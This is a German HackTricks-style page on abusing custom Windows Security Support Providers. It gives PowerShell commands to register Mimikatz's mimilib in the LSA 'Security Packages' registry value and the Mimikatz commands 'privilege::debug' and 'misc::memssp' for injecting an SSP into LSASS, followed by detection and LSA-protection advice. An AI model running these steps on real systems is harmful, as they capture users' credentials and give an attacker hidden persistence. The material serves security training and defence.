# Benutzerdefinierte Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) sind DLL-basierte Sicherheitspakete, die von der Local Security Authority (LSA) geladen werden. Windows registriert benutzerdefinierte SSP/AP-DLLs über den `REG_MULTI_SZ`-Wert `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` und lädt registrierte Pakete beim Systemstart.<sup>[[1]](#references)</sup>

Da SSPs innerhalb der LSA ausgeführt werden und Zugangsdaten empfangen können, können Angreifer ein schädliches Paket für den Zugriff auf Zugangsdaten und zur Persistenz missbrauchen. MITRE verfolgt dieses Verhalten als T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz enthält `mimilib.dll`, das einen SSP implementiert, der nach dem Laden die verarbeiteten Zugangsdaten protokolliert. In einem autorisierten Lab platziert man die DLL, die zur Architektur des Ziels passt, in `C:\Windows\System32` und überprüft anschließend die aktuelle Paketliste, bevor Änderungen vorgenommen werden.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Ein typischer vorhandener Wert kann Pakete wie `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` und `pku2u` enthalten. Bewahre jeden vorhandenen Eintrag auf, wenn du das benutzerdefinierte Paket hinzufügst.<sup>[[1]](#references)</sup>

Füge `mimilib` hinzu, ohne die vorhandenen Pakete zu ersetzen:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Nach einem Neustart wird das Paket in LSA geladen, und nachfolgend erfasste Zugangsdaten werden von dieser Implementierung in `C:\Windows\System32\kiwissp.log` geschrieben.<sup>[[2]](#references)[[3]](#references)</sup>

## Laden im Speicher

Mimikatz kann seine SSP-Implementierung auch in den aktuellen LSASS-Prozess injizieren:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Diese Methode bleibt über einen Neustart hinweg nicht bestehen.<sup>[[2]](#references)[[3]](#references)</sup>

## Erkennung und Abwehr

Überwachen Sie Änderungen an `...\Lsa\Security Packages` und unerwartete DLL-Ladevorgänge in `lsass.exe`. Das Sicherheitsereignis 4657 zeichnet eine Änderung eines Registrierungs-**Werts** nur auf, wenn die entsprechende Richtlinie für die Überwachung der Registrierung und die SACL konfiguriert sind.<sup>[[2]](#references)[[4]](#references)</sup>

Aktivieren Sie, sofern kompatibel, den zusätzlichen LSA-Schutz und untersuchen Sie nicht signierte oder unerwartete SSP-DLLs. Microsoft dokumentiert den LSA-Schutz ausdrücklich als Maßnahme gegen Code-Injection, die Anmeldedaten kompromittieren könnte.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registrieren von SSP/AP-DLLs](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz-Repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Sicherheitsereignis 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Zusätzlichen LSA-Schutz konfigurieren](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
